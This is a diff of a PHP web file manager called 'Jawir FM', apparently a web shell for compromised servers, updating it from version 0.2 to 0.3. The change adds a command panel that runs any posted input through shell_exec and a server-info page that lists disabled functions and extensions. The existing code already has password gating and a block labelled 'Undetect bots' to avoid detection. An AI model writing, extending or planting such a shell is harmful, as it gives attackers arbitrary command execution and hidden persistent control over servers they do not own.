@@ -1,6 +1,6 @@
 <?php
 session_start();
-define('APP_VER', '0.2');
+define('APP_VER', '0.3');
 $password = defined('PW') ? PW : '5c5fa09440696b310b4b1750d49f84ca';
 
 // Undetect bots
@@ -21,6 +21,7 @@ if (!isset($_SESSION['logged_in'])) {
 }
 
 // Path
+$action = isset($_GET['action']) ? $_GET['action'] : 'filemanager';
 $path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
 if (!$path || !is_dir($path)) $path = getcwd();
 $parent = dirname($path);
@@ -38,7 +39,12 @@ $search = isset($_GET['search']) ? $_GET['search'] : '';
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     try {
         $self = basename(__FILE__);
-        if (isset($_POST['get_content'])) {
+        if($action=='command' && isset($_POST['cmd'])){
+            $output = shell_exec($_POST['cmd'].' 2>&1');
+            echo '<pre class="bg-black text-green-400 p-2 rounded">'.$output.'</pre>';
+            exit;
+        }
+        elseif (isset($_POST['get_content'])) {
             $f = basename($_POST['get_content']);
             if ($f == $self) {
                 echo 'Author @willygoid';
@@ -171,6 +177,17 @@ foreach ($parts as $part) {
 // Goto Dir
 $self_dir = dirname(realpath(__FILE__));
 $docroot = realpath($_SERVER['DOCUMENT_ROOT']);
+
+//Server info
+function getServerInfo(){
+    return [
+        'OS' => php_uname(),
+        'PHP Version' => PHP_VERSION,
+        'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI',
+        'Disabled Functions' => ini_get('disable_functions'),
+        'Loaded Extensions' => implode(', ', get_loaded_extensions()),
+    ];
+}
 ?>
 <!DOCTYPE html>
 <html>
@@ -191,6 +208,7 @@ body.dark .text-gray-700 { color: #d1d5db !important; }
 body.dark .text-gray-500 { color: #9ca3af !important; }
 body.dark .bg-gray-50 { background-color: #374151 !important; }
 body.dark .bg-gray-300 {background-color: #4b5563 !important; color: #f9fafb !important;}
+body.dark .bg-gray-200 {background-color: #4b5563 !important; color: #f9fafb !important;}
 </style>
 <script>
 $(function(){
@@ -207,10 +225,23 @@ $(function(){
     $('#uploadInput').change(()=>$('#uploadForm').submit());
 });
 </script>
+<script>
+$(function(){
+    $('.menu-btn').click(function(){
+        let act=$(this).data('action');
+        $('.menu-btn').removeClass('bg-blue-500 text-white').addClass('bg-gray-200 text-gray-800');
+        $(this).addClass('bg-blue-500 text-white');
+        $('#content').html('<div class="text-center p-4">Loading...</div>');
+        $.get('?action='+act,function(d){ $('#content').html(d); });
+    });
+    // on load, highlight active
+    $('.menu-btn[data-action="<?=$action?>"]').addClass('bg-blue-500 text-white').removeClass('bg-gray-200 text-gray-800');
+});
+</script>
 <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
 </head>
-<body class="bg-gray-100">
+<body id="content" class="bg-gray-100">
 <header class="container mx-auto flex items-center justify-between p-4">
     <a href="?path=<?=urlencode($self_dir)?>" class="flex items-center">
         <h1 class="text-xl sm:text-2xl lg:text-3xl font-bold">Jawir FM</h1>
@@ -219,6 +250,11 @@ $(function(){
         <img alt="Logo App" class="h-8 md:h-12" src="//sga-cdn-hxg6b2d7ctb2c0eu.z02.azurefd.net/agent-websites/319/medialibrary/images/319_756a1e4ed5294e85a8c61f1031637228.webp"/>
     </a>
 </header>
+<div class="container mx-auto flex space-x-2 mb-4">
+    <button data-action="filemanager" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">📁 File Manager</button>
+    <button data-action="serverinfo" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">💻 Server Info</button>
+    <button data-action="command" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">💡 Command</button>
+</div>
 <main role="main" class="container mx-auto mb-4">
 <nav class="flex px-5 py-3 text-gray-700 border border-gray-200 rounded-lg bg-gray-50" aria-label="Breadcrumb">
   <ol class="inline-flex items-center space-x-1 md:space-x-2 rtl:space-x-reverse">
@@ -246,6 +282,30 @@ $(function(){
   </ol>
 </nav>
 </main>
+<?php
+if($action=='serverinfo'):
+    $info=getServerInfo(); ?>
+    <div class="container mx-auto p-4 bg-white rounded-lg shadow">
+    <h2 class="text-xl font-bold mb-2">💻 Server Info</h2>
+    <ul class="list-disc pl-5">
+    <?php foreach($info as $k=>$v): ?>
+    <li><span class="font-semibold"><?=htmlspecialchars($k)?>:</span> <span class="text-gray-700"><?=htmlspecialchars($v)?></span></li>
+    <?php endforeach; ?>
+    </ul>
+    </div>
+
+<?php elseif($action=='command'): ?>
+    <div class="container mx-auto p-4 bg-white rounded-lg shadow">
+    <h2 class="text-xl font-bold mb-2">💡 Execute Command</h2>
+    <form method="post" onsubmit="$.post('?action=command',$ (this).serialize(),function(d){$('#output').html(d);});return false;">
+    <input name="cmd" class="border w-full px-2 py-1 mb-2" placeholder="Enter command...">
+    <button class="bg-green-500 text-white px-3 py-1 rounded">Run</button>
+    </form>
+    <div id="output" class="mt-2 text-sm"></div>
+    </div>
+
+<?php else: ?>
+
 <div class="container mx-auto p-4 bg-white rounded-lg shadow">
     <div class="flex justify-between mb-4">
     <div class="flex space-x-2">
@@ -344,6 +404,15 @@ $(function(){
 <input name="perm_value" class="border px-2 mb-2" placeholder="e.g. 755">
 <div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">🔧 Update</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
 
+<?php if(isset($_SESSION['msg'])): ?>
+<script>
+toastr.options = { "closeButton": true, "progressBar": true, "positionClass":"toast-top-right"};
+toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($_SESSION['msg']) ?>");
+</script>
+<?php unset($_SESSION['msg'],$_SESSION['msg_type']); endif; ?>
+
+<?php endif;?>
+
 <footer class="container mx-auto p-4">
       <div class="flex flex-col sm:flex-row justify-between items-center pt-4 border-t border-gray-300">
         <div class="flex-grow lg:w-1/2 text-gray-600">
@@ -353,14 +422,6 @@ $(function(){
         </div>
       </div>
 </footer>
-
-<?php if(isset($_SESSION['msg'])): ?>
-<script>
-toastr.options = { "closeButton": true, "progressBar": true, "positionClass":"toast-top-right"};
-toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($_SESSION['msg']) ?>");
-</script>
-<?php unset($_SESSION['msg'],$_SESSION['msg_type']); endif; ?>
-
 <script>
 $(function(){
   $('#toggleTheme').click(function(){
